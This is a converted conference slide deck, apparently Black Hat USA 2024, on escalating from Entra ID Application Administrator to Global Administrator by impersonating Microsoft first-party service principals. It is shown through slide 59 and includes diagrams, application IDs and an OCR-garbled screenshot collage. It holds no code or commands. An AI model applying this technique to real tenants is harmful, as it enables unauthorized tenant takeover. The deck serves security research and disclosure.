---
title: "UnOAuthorized A Technique to Privilege Escalation to Global Administrator"
speakers: ["Eric Woodruff"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Eric Woodruff_UnOAuthorized A Technique to Privilege Escalation to Global Administrator.pdf"
pages: 137
sha256: "43848c0672bcb4d9edfc00eaef1ad0d27ac0a1c46b8d6befc8affe7a2e105a05"
text_chars: 70145
ocr_pages: 30
has_ocr: true
redacted_secrets: 0
ocr_confidence: 82.6
ocr_unreliable_blocks: 0
vision_verified_blocks: 24
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:31:44Z"
---
# UnOAuthorized A Technique to Privilege Escalation to Global Administrator

**Speakers:** Eric Woodruff  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Eric Woodruff_UnOAuthorized A Technique to Privilege Escalation to Global Administrator.pdf` (137 pages)


## Slide 1

# UnOAuthorized

Eric Woodruff Senior Security Researcher, Semperis

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AUGUST 7-8, 2024
BRIEFINGS
UnOAuthorized
Eric Woodruff
Senior Security Researcher, Semperis
#BHUSA
```

## Slide 2

Eric Woodruff Senior Security Researcher

@ericonidentity.com

@ericonidentity

/in/ericonidentity

@ericonidentity@infosec.exchange

#BHUSA @BlackHatEvents

## Slide 3

# Unauthorized+ OAuth 2.0

#BHUSA @BlackHatEvents

## Slide 4

# Unauthorized<sup>1</sup> + OAuth 2.0

#BHUSA @BlackHatEvents

## Slide 5

# UnOAuthorized<sup>1</sup>

> 1 h/t to myself, AI did not help with this name

#BHUSA @BlackHatEvents

## Slide 6

# Background

#BHUSA @BlackHatEvents

## Slide 7

## Background

### Plenty of research on Entra ID app permissions and roles<sup>1</sup>

- <u>GitHub - secureworks/family-of-client-ids-research: Research into Undocumented Behavior of Azure AD Refresh Tokens</u>

- <u>Azure Redirect URI Takeover Vulnerability | Secureworks</u>

- <u>Everything about Service Principals, Applications, and API Permissions | Microsoft 365 Security (m365internals.com)</u>

- <u>Automating application permission grant while avoiding AppRoleAssignment.ReadWrite.All | by Sahil Malik | Winsmarts.com</u>

- <u>Stealthy Persistence with “Directory Synchronization Accounts” Role in Entra ID | by Clément Notin [Tenable] | Tenable TechBlog | Jun, 2024 | Medium</u>

- <u>The Intersection of Graph and Entra ID: Application Permissions and Roles - Eric on Identity</u>

- <u>Azure AD privilege escalation - Taking over default application permissions as Application Admin - dirkjanm.io</u>

- • <u>The Most Dangerous Entra Role You’ve (Probably) Never Heard Of | by Andy Robbins | Posts By SpecterOps Team Members</u>

- <u>How to Backdoor Azure Applications and Abuse Service Principals (inversecos.com)</u>

1A very small, non-exhaustive list

#BHUSA @BlackHatEvents

## Slide 8

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
«A.
The Most Dangerous Entra Role
You’ve (Probably) Never Heard Of
@ Andy Robbins - Follow
6 Published in Posts By SpecterOps Team Members - 6 minread - Feb 16,2024
portal GUI.
Dirk-jan Mollema
vulnerabilities.
Looking for a security test or training? Business contact via outsidersecurity.nl
permissions as Application Admin
During both my DEF CON and Troopers | mentioned a vulnerab
where an A
On-Premise Sync Ac
|
€
Admin ora comp
Secureworks®
is
HREAT ANALYSIS
AZURE REDIRECT URI TAKEOVER
ULNERABILITY
Entra ID has a built-in role called “Partner Tier2 Support” that enables
escalation to Global Admin, but this role is hidden from view in the Azure
Hacker, red teamer, researcher. Likes to write infosec-focussed Python tools. This is my personal blog
containing research on topics | find interesting, such as (Azure) Active Directory internals, protocols an
Azure AD privilege escalation - Taking over default application
How to Backdoor Azure Applications and Abuse Service Principals
Stealthy Persistence with
“Directory Synchronization
Accounts” Role in Entra ID
<
If an attacker gains a oan Azure 449) Clément Notin [Tenable] - Follow
a “certificate” to an application. This will @ Published in Tenable TechBlog - 8minread - Jun 3,2024
attacker to per pli
tenant has a serv al autor ed/created. This ha ery time an application
Joo A service principal account is basically an identity that’s used by a2 Q t+ Gy
urces / perform automated actions
« Thes unts cannot be controlled through conditional access
ate
to backdoor th
post as simple as I
Automating application permission
grant while avoiding
AppRoleAssignment.ReadWrite.All
Sahil Malik - Fo!
Published in Winsmarts.com
Sminread - Apr 29,2021
Ina previous blogpost, Lhad detailed out the steps for automating
permission grants (for both delegated and application permissions) from a
headless process, i.e. in automation, using a managed identity or service
prinicipal. This is something you'd often use in DevOps.
There was a hie downside in the annroach I had outlined. it required vou to
have several)
register an application within an Azure portal;
) and lastly, how to detect this. I tri
Summary
The “Directory Synchronization Accounts” Entra role is very powerful
(allowing privilege escalation to the Global Administrator role) while being
hidden in Azure portal and Entra admin center, in addition to being poorly
=
P) documented, making it a perfect stealthy backdoor for persistence in Entra
ied to make this b uri ID @
Everything About Service Principals, Applications, And
API Permissions
Posted on July
Service Principals are identities used by created applications, services, and automation
Abusing Family Refresh Tokens for Unauthorized Access
and Persistence in Azure Active Directory
co
th
ar
a: * Ryan Marcotte Cobb, CTU Special Operations
* Tony Gore, CTU Special Operations
Undocumented functionality in Azure Active Directory allows a group of Microsoft OAuth client applications to obtain
special “family refresh tokens,” which can be redeemed for bearer tokens as any other client in the family. We will
discuss how this functionality was uncovered, the mechanism behind it, and various attack paths to obtain family
refresh tokens. We will demonstrate how this functionality can be abused to access sensitive data. Lastly, we will share
relevant information to mitigate the theft of family refresh tokens.
```

## Slide 9

DOMAIN ADMIN
GLOBAL ADMIN

#BHUSA @BlackHatEvents

## Slide 10

# Setting the stage

#BHUSA @BlackHatEvents

## Slide 11

## Application Administrator Role

Entra ID

#BHUSA @BlackHatEvents

## Slide 12

## Application Administrator Role

Entra ID

Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 13

## Application Administrator Role

Entra ID

Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 14

## Application Administrator Role

Application A

Entra ID

Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 15

## Application Administrator Role

Application A

Application B

Entra ID

Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 16

## Application Administrator Role

Application A
Application B
Application C
Entra ID

Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 17

## Application Administrator Role

Application A
Application B
Application C
Entra ID
Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 18

## Application Administrator Role

Application A
Application B
Application C
Entra ID
Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 19

|Services (Local)|ActiveX Installer (AxInstSV)|Provides U..||Manual|Local System|
|---|---|---|---|---|---|
||Agent Activation Runtime_...|Runtime for…||Manual|Local System|
||AllJoyn Router Service|Route AllJo…||Manual (Trigg…|Local Service|
||App Readiness|Gets apps re…||Manual|Local System|
||Application Identity|Determines …|Running|Manual (Trigg…|Local Service|
||Application Information|Facilitates th…|Running|Manual (Trigg…|Local System|
||Application Layer Gatewa…|Provides sup…||Manual|Local Service|
||Application Management|Processes in…||Manual|Local System|
||AppX Deployment Service…|Provides inf…|Running|Manual (Trigg…|Local System|
||AssignedAccessManager…|AssignedAc…||Manual (Trigg…|Local System|
||Auto Time Zone Updater|Automatical…||Manual (Trigg…|Local Service|
||AVCTP service|This is Audi…|Running|Manual (Trigg…|Local Service|
||Background Intelligent Tra…|Transfers file…|Running|Automatic (D…|Local System|
||Background Tasks Infras…|Windows inf…|Running|Automatic|Local System|
||Base Filtering Engine|The Base Fi…|Running|Automatic|Local Service|
||BitLocker Drive Encryption…|BDESVC ho…|Running|Manual (Trigg…|Local System|
||Block Level Backup Engin…|The BENGI…||Manual|Local System|
||Bluetooth Audio Gateway…|Service supp…|Running|Manual (Trigg…|Local Service|
||Bluetooth Support Servic…|The Bluetoo…|Running|Manual (Trigg…|Local Service|
||Bluetooth User Support…|The Bluetoo…|Running|Manual (Trigg…|Local System|
||BranchCache|This service …||Manual|Local System|
||BTErgoMouseNotifactio…||Running|Automatic|Local System|
||Capability Access Manager…|Provides faci…|Running|Manual (Trigg…|Local System|
||CaptureService_1d9330…|Enables opti…||Manual|Local System|
||Cellular Time|This service…||Manual (Trigg…|Local Service|
||Certificate Propagation|Copies user…|Running|Manual (Trigg…|Local System|
||Client License Service (Cli…|Provides infr…||Manual (Trigg…|Local System|
||Clipboard User Service_1d…|This user ser…|Running|Automatic (D…|Local System|
||Cloud Backup and Restore…|Monitors the…||Manual|Local System|
||CNG Key Isolation|The CNG ke…|Running|Manual (Trigg…|Local System|
||COM+ Event System|Supports Sy…|Running|Automatic|Local Service|
||COM+ System Application|Manages the…||Manual|Local System|
||Computer Browser|Maintains a…||Manual (Trigg…|Local System|

**#BHUSA @BlackHatEvents**

## Slide 20

|Services (Cloud)|||||
|---|---|---|---|---|
||Office 365 Exchange Online|Running|Automatic|00000002-0000-0ff1-ce00-000000000000|
||Office 365 SharePoint Onli…|Running|Automatic|00000003-0000-0ff1-ce00-000000000000|
||Microsoft Teams|Running|Automatic|1fec8e78-bce4-4aaf-ab1b-5451cc387264|
||Azure Key Vault|Running|Automatic|589d5083-6f11-4d30-a62a-a4b316a14abf|
||Microsoft Office 365 Portal|Running|Automatic|00000006-0000-0ff1-ce00-000000000000|
||Azure Bastion|Running|Automatic|79d7fb34-4bef-4417-8184-ff713af7a679|
||Microsoft Intune|Running|Automatic|9cb77803-d937-493e-9a3b-4b49de3f5a74|
||Azure Portal|Running|Automatic|c44b4083-3bb0-49c1-b47d-974e53cbdf3c|
||Windows 365|Running|Automatic|0af06dc6-e4b5-4f28-818e-e78e62d137a5|
||M365 Admin Service
Device Registration Service
Microsoft Rights Managem…
OfficeClientService
IAM Supportability
Azns AAD Webhook
O365Account
AD Hybrid Health
OCaaS Worker Service
Microsoft Threat Protection
Service Encryption
ACR-Tasks-Network
O365 Demeter
MAPG
Outlook Web App Widgets
TeamsLinkedInLiveApp
MS-PIM
SubstrateActionsService
Azure ESTS Service
Graph Connector Service
console-m365d
Office365 Shell SS-Server
Azure AD Notification
Yggdrasil|Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running
Running|Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic
Automatic|6b91db1b-f05b-405a-a0b2-e3f60b28d645
01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
00000012-0000-0000-c000-000000000000
0f698dd4-f011-4d23-a33e-b36416dcb1e6
a57aca87-cbc0-4f3c-8b9e-dc095fdc8978
461e8683-5575-4561-ac7f-899cc907d62a
e158eb19-34ac-4d1b-a930-ec92172f7a97
6ea8091b-151d-447a-9013-6845b83ba57b
167e2ded-f32d-49f5-8a10-308b921bc7ee
8ee8fdad-f234-4243-8f3b-15c294843740
dbc36ae1-c097-4df9-8d94-343c3d091a76
62c559cd-db0c-4da0-bab2-972528c65d42
982bda36-4632-4165-a46a-9863b1bbcf7d
cc46c2aa-d508-409b-aeb7-df7cd1e07aaa
87223343-80b1-4097-be13-2332ffa1d666
31ba6d5c-2e14-40fb-bbcb-27dc8a1bfaf5
01fc33a7-78ba-4d2f-a4b7-768e336e890e
06dd8193-75af-46d0-84bb-9b9bcaa89e8b
00000001-0000-0000-c000-000000000000
56c1da01-2129-48f7-9355-af6d59d42766
f18b59c9-5926-4a65-8605-c23ec8c7e074
e8bdeda8-b4a3-4eed-b307-5e2456238a77
fc03f97a-9db0-4627-a216-ec98ce54e018
78e7bc61-0fab-4d35-8387-09a8d2f5a59d|

**#BHUSA @BlackHatEvents**

## Slide 21

|Services (Cloud)|||||
|---|---|---|---|---|
||Office 365 Exchange Online|Running|Automatic|00000002-0000-0ff1-ce00-000000000000|
||Office 365 SharePoint Onli…|Running|Automatic|00000003-0000-0ff1-ce00-000000000000|
||Microsoft Teams|Running|Automatic|1fec8e78-bce4-4aaf-ab1b-5451cc387264|
||Azure Key Vault|Running|Automatic|589d5083-6f11-4d30-a62a-a4b316a14abf|
||Microsoft Office 365 Portal|Running|Automatic|00000006-0000-0ff1-ce00-000000000000|
||Azure Bastion|Running|Automatic|79d7fb34-4bef-4417-8184-ff713af7a679|
||Microsoft Intune|Running|Automatic|9cb77803-d937-493e-9a3b-4b49de3f5a74|
||Azure Portal|Running|Automatic|c44b4083-3bb0-49c1-b47d-974e53cbdf3c|
||Windows 365|Running|Automatic|0af06dc6-e4b5-4f28-818e-e78e62d137a5|
||M365 Admin Service|Running|Automatic|6b91db1b-f05b-405a-a0b2-e3f60b28d645|
||Device Registration Service|Running|Automatic|01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9|
||Microsoft Rights Managem…|Running|Automatic|00000012-0000-0000-c000-000000000000|
||OfficeClientService|Running|Automatic|0f698dd4-f011-4d23-a33e-b36416dcb1e6|
||IAM Supportability|Running|Automatic|a57aca87-cbc0-4f3c-8b9e-dc095fdc8978|
||Azns AAD Webhook|Running|Automatic|461e8683-5575-4561-ac7f-899cc907d62a|
||O365Account|Running|Automatic|e158eb19-34ac-4d1b-a930-ec92172f7a97|
||AD Hybrid Health|Running|Automatic|6ea8091b-151d-447a-9013-6845b83ba57b|
||OCaaS Worker Service|Running|Automatic|167e2ded-f32d-49f5-8a10-308b921bc7ee|
||Microsoft Threat Protection|Running|Automatic|8ee8fdad-f234-4243-8f3b-15c294843740|
||Service Encryption|Running|Automatic|dbc36ae1-c097-4df9-8d94-343c3d091a76|
||ACR-Tasks-Network|Running|Automatic|62c559cd-db0c-4da0-bab2-972528c65d42|
||O365 Demeter|Running|Automatic|982bda36-4632-4165-a46a-9863b1bbcf7d|
||MAPG|Running|Automatic|cc46c2aa-d508-409b-aeb7-df7cd1e07aaa|
||Outlook Web App Widgets|Running|Automatic|87223343-80b1-4097-be13-2332ffa1d666|
||TeamsLinkedInLiveApp|Running|Automatic|31ba6d5c-2e14-40fb-bbcb-27dc8a1bfaf5|
||MS-PIM|Running|Automatic|01fc33a7-78ba-4d2f-a4b7-768e336e890e|
||SubstrateActionsService|Running|Automatic|06dd8193-75af-46d0-84bb-9b9bcaa89e8b|
||Azure ESTS Service|Running|Automatic|00000001-0000-0000-c000-000000000000|
||Graph Connector Service|Running|Automatic|56c1da01-2129-48f7-9355-af6d59d42766|
||console-m365d|Running|Automatic|f18b59c9-5926-4a65-8605-c23ec8c7e074|
||Office365 Shell SS-Server|Running|Automatic|e8bdeda8-b4a3-4eed-b307-5e2456238a77|
||Azure AD Notification|Running|Automatic|fc03f97a-9db0-4627-a216-ec98ce54e018|
||Yggdrasil|Running|Automatic|78e7bc61-0fab-4d35-8387-09a8d2f5a59d|

**#BHUSA @BlackHatEvents**

## Slide 22

# Application primer

#BHUSA @BlackHatEvents

## Slide 23

## Multi-tenant applications

#### Publisher Tenant

#BHUSA @BlackHatEvents

## Slide 24

## Multi-tenant applications

#### Publisher Tenant

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 25

## Multi-tenant applications

#### Publisher Tenant

App Registration
Some Application
86261278-59ef-4d12-8e21-0c1d99a5e6d1

Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

#BHUSA @BlackHatEvents

## Slide 26

## Multi-tenant applications

#### Publisher Tenant

App Registration
Some Application
86261278-59ef-4d12-8e21-0c1d99a5e6d1

Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 27

## Multi-tenant applications

#### Publisher Tenant

App Registration
Some Application
86261278-59ef-4d12-8e21-0c1d99a5e6d1

Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

#BHUSA @BlackHatEvents

## Slide 28

## Multi-tenant applications

#### Publisher Tenant

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

Credential

#BHUSA @BlackHatEvents

## Slide 29

## Multi-tenant applications

#### Publisher Application

#### Publisher Tenant

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 30

## Multi-tenant applications

#### Publisher Application

#### Publisher Tenant

App Registration
Some Application
86261278-59ef-4d12-8e21-0c1d99a5e6d1
Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

#BHUSA @BlackHatEvents

## Slide 31

## Multi-tenant applications

#### Publisher Application

#### Publisher Tenant

Client ID

App Registration
Some Application
86261278-59ef-4d12-8e21-0c1d99a5e6d1
Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

#BHUSA @BlackHatEvents

## Slide 32

## Multi-tenant applications

#### Customer Tenant

#### Publisher Application

#### Publisher Tenant

Client ID

App Registration
Some Application
86261278-59ef-4d12-8e21-0c1d99a5e6d1
Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

#BHUSA @BlackHatEvents

## Slide 33

## Multi-tenant applications

#### Customer Tenant

#### Publisher Application

#### Publisher Tenant

Global Admin

Client ID

App Registration
Some Application
86261278-59ef-4d12-8e21-0c1d99a5e6d1
Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

#BHUSA @BlackHatEvents

## Slide 34

## Multi-tenant applications

Customer Tenant

Publisher Application

Publisher Tenant

Client ID Global Admin

Service Principal ~~Admin Consent~~ Some Application 3161e102-4911-49af-8456-9dadde565c01 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 35

## Multi-tenant applications

Customer Tenant

Customer Tenant Publisher Application Client ID Global Admin Service Principal ~~Admin Consent~~ Some Application 3161e102-4911-49af-8456-9dadde565c01 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

Publisher Tenant

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 36

## Multi-tenant applications

Customer Tenant

Publisher Application

Publisher Tenant

Client ID Global Admin Service Principal ~~Admin Consent~~ Some Application 3161e102-4911-49af-8456-9dadde565c01

Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 37

## Multi-tenant applications

#### Customer Tenant

#### Publisher Application

#### Publisher Tenant

Service Principal Some Application 3161e102-4911-49af-8456-9dadde565c01

Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

Client ID

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 38

## Multi-tenant applications

#### Customer Tenant

#### Publisher Application

#### Publisher Tenant

Service Principal Some Application 3161e102-4911-49af-8456-9dadde565c01

Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

Client ID

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 39

## Multi-tenant applications

Customer Tenant

Publisher Application

Publisher Tenant

AuthN
Client ID

Service Principal Some Application 3161e102-4911-49af-8456-9dadde565c01 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 40

## Multi-tenant applications

Customer Tenant

#### Publisher Application

Publisher Tenant

Access Token
Client ID

Service Principal Some Application 3161e102-4911-49af-8456-9dadde565c01 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 41

## Multi-tenant applications

#### Customer Tenant

Publisher Application

Publisher Tenant

Access Token
Client ID
Access Token
(AuthZ)
Customer Tenant

Service Principal Some Application 3161e102-4911-49af-8456-9dadde565c01 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Some Application 86261278-59ef-4d12-8e21-0c1d99a5e6d1 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 42

## Multi-tenant applications

Customer Tenant

Customer Tenant Publisher Application ~~Access Token~~ Client ID Service Principal Some Application 3161e102-4911-49af-8456-9dadde565c01 Application Permissions Access Token _User.ReadWrite.All Directory.ReadWrite.All_ (AuthZ) _Group.Read.All_ Customer Tenant Stuff

Publisher Tenant

App Registration
Some Application
86261278-59ef-4d12-8e21-0c1d99a5e6d1
Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 43

## Microsoft applications

#### Customer Tenant

Device Registration Service

Microsoft Tenant

Client ID

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 44

## Microsoft applications

#### Customer Tenant

Device Registration Service

Microsoft Tenant

Client ID

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 45

## Microsoft applications

#### Customer Tenant

Device Registration Service

Microsoft Tenant

AuthN

Client ID

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 46

## Microsoft applications

#### Customer Tenant

Device Registration Service

Microsoft Tenant

Access Token

Client ID

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 47

## Microsoft applications

#### Customer Tenant

Device Registration Service

Microsoft Tenant

Access Token

Client ID

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions Access Token _User.ReadWrite.All Directory.ReadWrite.All_ (AuthZ) _Group.Read.All_ Customer Tenant

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 48

## Microsoft applications

Customer Tenant

Customer Tenant Device Registration Service
Access Token
Client ID
Service Principal
Device Registration Service
7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686
Application Permissions Access Token
User.ReadWrite.All
Directory.ReadWrite.All
(AuthZ)
Group.Read.All
Customer Tenant
Stuff

Microsoft Tenant

App Registration
Device Registration Service
01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 49

## Microsoft applications

#### Customer Tenant

Device Registration Service

Microsoft Tenant

Client ID
Service Principal
Device Registration Service
7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686
Application Permissions Access Token
User.ReadWrite.All
Directory.ReadWrite.All
(AuthZ)
Group.Read.All
Customer Tenant
Stuff

App Registration
Device Registration Service
01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Application Permissions
User.ReadWrite.All
Directory.ReadWrite.All
Group.Read.All
Credential

Other APIs

#BHUSA @BlackHatEvents

## Slide 50

# The research

#BHUSA @BlackHatEvents

## Slide 51

## Impersonating Microsoft applications

#### Customer Tenant

#### Microsoft Tenant

Service Principal App Registration Device Registration Service Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions Application Permissions _User.ReadWrite.All User.ReadWrite.All Directory.ReadWrite.All Directory.ReadWrite.All Group.Read.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 52

Impersonating Microsoft applications Customer Tenant Microsoft Tenant Act as Microsoft service principals for multi-tenant applications

Service Principal App Registration Device Registration Service Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions“Borrowing their identity”Application Permissions _User.ReadWrite.All User.ReadWrite.All Directory.ReadWrite.All Directory.ReadWrite.All Group.Read.All Group.Read.All_

Credential

#BHUSA @BlackHatEvents

## Slide 53

## Impersonating Microsoft applications

#### Customer Tenant

#### Microsoft Tenant

Service Principal App Registration Device Registration Service Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions Application Permissions _User.ReadWrite.All User.ReadWrite.All Directory.ReadWrite.All Directory.ReadWrite.All Group.Read.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 54

## Impersonating Microsoft applications

#### Customer Tenant

#### Microsoft Tenant

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 55

## Impersonating Microsoft applications

Customer Tenant

Impersonating Application

#### Microsoft Tenant

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 56

## Impersonating Microsoft applications

#### Customer Tenant

Impersonating Application

#### Microsoft Tenant

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Client ID

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

#BHUSA @BlackHatEvents

## Slide 57

## Impersonating Microsoft applications

Customer Tenant

Impersonating Application

Microsoft Tenant

Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Client ID

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 58

## Impersonating Microsoft applications

Customer Tenant

Impersonating Application

Microsoft Tenant

~~AuthN~~ Client ID

Service Principal App Registration Device Registration Service Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions Application Permissions _User.ReadWrite.All User.ReadWrite.All Directory.ReadWrite.All Directory.ReadWrite.All Group.Read.All Group.Read.All_ Credential Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 59

## Impersonating Microsoft applications

Customer Tenant Impersonating Application

Microsoft Tenant

~~Access Token~~

Client ID

